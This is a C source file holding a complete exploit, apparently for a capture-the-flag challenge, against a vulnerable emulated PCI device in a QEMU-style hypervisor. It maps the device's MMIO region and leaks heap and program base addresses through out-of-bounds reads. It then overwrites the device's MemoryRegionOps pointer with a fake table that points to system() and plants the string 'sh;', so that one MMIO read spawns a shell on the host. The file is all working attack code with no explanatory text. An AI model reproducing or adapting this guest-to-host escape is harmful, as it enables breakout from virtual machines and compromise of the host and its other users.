#include <assert.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/io.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <termios.h>
#include <unistd.h>

struct PCIBabyDevReg {
  off_t offset;
  uint32_t data;
};

#define MMIO_SET_OFFSET offsetof(struct PCIBabyDevReg, offset)
#define MMIO_SET_DATA offsetof(struct PCIBabyDevReg, data)
#define MMIO_GET_DATA offsetof(struct PCIBabyDevReg, data)

unsigned char* io_mem;
void mmio_write(uint64_t addr, uint32_t value) {
  *((uint32_t*)(io_mem + addr)) = value;
}

uint32_t mmio_read(uint64_t addr) { return *((uint32_t*)(io_mem + addr)); }

uint32_t readoff(uint32_t offset) {
  mmio_write(MMIO_SET_OFFSET, offset);  // write 32 bit
  // Step 3: Read data back from the buffer at the offset
  uint32_t data_read = mmio_read(MMIO_GET_DATA);
  return data_read;
}

uint64_t readoff64(uint32_t offset) {
  mmio_write(MMIO_SET_OFFSET, offset);  // write 32 bit
  // Step 3: Read data back from the buffer at the offset
  uint32_t data_read = mmio_read(MMIO_GET_DATA);
  mmio_write(MMIO_SET_OFFSET, offset + 4);  // write 32 bit
  // Step 3: Read data back from the buffer at the offset
  uint64_t result = ((uint64_t)mmio_read(MMIO_GET_DATA) << 32) | (data_read);
  return result;
}

void writeoff64(uint32_t offset, uint64_t val) {
  mmio_write(MMIO_SET_OFFSET, offset);  // write 32 bit
  // Step 3: Read data back from the buffer at the offset
  mmio_write(MMIO_SET_DATA, (uint32_t)val);
  mmio_write(MMIO_SET_OFFSET, offset + 4);  // write 32 bit
  // Step 3: Read data back from the buffer at the offset
  mmio_write(MMIO_SET_DATA, val >> 32UL);
}

int main(int argc, char const* argv[]) {
  int fd;
  if ((fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",
                 O_RDWR | O_SYNC)) == -1) {
    perror("open pci device");
    exit(-1);
  }
  // Map the MMIO region into memory
  io_mem = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  if (io_mem == MAP_FAILED) {
    perror("mmap failed");
    close(fd);
    exit(-1);
  }
  printf("[*] iomem %p\n", io_mem);

  uint64_t heap = readoff64(0x120) - 0x115f840;
  uint64_t pie = readoff64(0x120 + 32) - 0x7af330;
  uint64_t fp = pie + 0xd1d100;
  uint64_t MemoryRegionOps_pointer = heap + 0x1161470;
  uint64_t buffer = heap + 0x1161538;
  uint64_t system_addr = pie + 0x00324150;
  uint64_t fake_MemoryRegionOps = buffer + 32;
  uint64_t opaque = heap + 0x1160940;
  printf("[+] heap: 0x%lx\n", heap);
  printf("[+] pie: 0x%lx\n", pie);
  printf("[+] fp: 0x%lx\n", fp);
  printf("[+] MemoryRegionOps_pointer: 0x%lx\n", MemoryRegionOps_pointer);
  printf("[+] buffer: 0x%lx\n", buffer);
  printf("[+] system: 0x%lx\n", system_addr);
  printf("[+] fake_MemoryRegionOps: 0x%lx\n", fake_MemoryRegionOps);
  int ooo = 32;
  // writeoff64(ooo,system_addr);
  writeoff64(ooo, system_addr);
  ooo += 8;
  writeoff64(ooo, system_addr);
  ooo += 24;
  writeoff64(ooo, 0x2);
  ooo += 32;
  writeoff64(ooo, 0x400000001);
  mmio_write(MMIO_SET_OFFSET,
             (opaque - buffer) & ((1UL << 32) - 1UL));  // write 32 bit
  mmio_write(MMIO_SET_OFFSET + 4, -1);
  mmio_write(MMIO_SET_DATA, 3893363);
  // 0x1160940
  mmio_write(MMIO_SET_OFFSET, (MemoryRegionOps_pointer - buffer) &
                                  ((1UL << 32) - 1UL));  // write 32 bit
  mmio_write(MMIO_SET_OFFSET + 4, -1);
  // printf("%x\n", mmio_read(MMIO_GET_DATA));
  mmio_write(MMIO_SET_DATA, (fake_MemoryRegionOps) & ((1UL << 32) - 1UL));
  mmio_read(0);
  // Cleanup
  munmap(io_mem, 0x1000);
  close(fd);

  return 0;
}
